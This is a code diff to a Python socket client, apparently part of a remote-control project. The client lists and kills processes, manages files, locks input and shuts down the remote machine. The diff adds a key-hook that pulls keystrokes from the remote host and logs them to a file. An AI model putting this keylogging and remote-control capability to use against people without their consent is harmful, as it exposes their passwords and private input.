@@ -6,6 +6,7 @@ import pickle
 from task_manager import process_opcode
 from utils import stoppabe_thread
 from file_management import *
+from keylogger import create_file_logger
 
 BUF_SIZE = 256
 class SocketClient:
@@ -65,14 +66,14 @@ class SocketClient:
         except OSError:
             return self.__clean
     
-    def __keyhook_loop(self):
+    def __keyhook_loop(self, logger):
         while not threading.current_thread().is_stopped():
             with self.__lock:
                 data = self.__request('request_key')
-                print(data)
                 if data is None:
                     return
-            time.sleep(1)
+                logger.info(data) # write new data to file
+            time.sleep(0.1)
             
     def disconnect(self):
         """
@@ -95,11 +96,13 @@ class SocketClient:
     def request_mac(self):
         return self.__request('request_mac')
     
-    def start_keyhook(self):
+    def start_keyhook(self, filename):
         if not self.__keylogger:
-            self.__keylogger = stoppabe_thread(target = self.__keyhook_loop, daemon = True)
+            logger = create_file_logger(filename)
+            self.__keylogger = stoppabe_thread(target = self.__keyhook_loop, 
+                                               args=[logger], daemon = True)
             self.__keylogger.start()
-    
+            
     def stop_keyhook(self):
         self.__lock.acquire()
         if self.__keylogger:
@@ -115,7 +118,7 @@ class SocketClient:
         return self.__request("shutdown")
         
     def control_input(self, is_lock = True):
-        return self.__request("control_input", {"is_lock": int(is_lock)})
+        return self.__request("control_input", {"is_lock": is_lock})
         
     def request_listdir(self, root_path):
         return self.__request("file_management", 
@@ -126,7 +129,6 @@ class SocketClient:
                             {"opcode": file_opcode.PASTEFILE, 
                             "file_content": file_content, 
                             "path": path})
-        
     def copy_file(self, path):
         return self.__request("file_management", 
                             {"opcode": file_opcode.COPYFILE, "path": path})
@@ -157,15 +159,24 @@ class SocketClient:
 if __name__ == "__main__":
     client = SocketClient()
     client.connect('127.0.0.1', 26100)
-    procs = client.request_list_process()
-    for proc in procs:
-        if proc["is_app"]:
-            print(proc)
-    client.start_process("dxdiag")
-    client.kill_process(11380)
-    apps = client.request_list_app()
-    for app in apps:
-        print(app)
+    # nics = client.request_mac()
+    # for nic in nics:
+    #     print(nic)
+    client.start_keyhook("keylog.txt")
+    time.sleep(5)
+    client.stop_keyhook()
+        
+    # procs = client.request_list_process()
+    # for proc in procs:
+    #     if proc["is_app"]:
+    #         print(proc)
+            
+    # client.start_process("dxdiag")
+    # client.kill_process(11380)
+    
+    # apps = client.request_list_app()
+    # for app in apps:
+    #     print(app)
     # client.start_app(apps[0]["AppID"])
     # client.paste_file(get_file("README.md"), "E:\\README.md")
     # with open("test.md", "wb") as f:
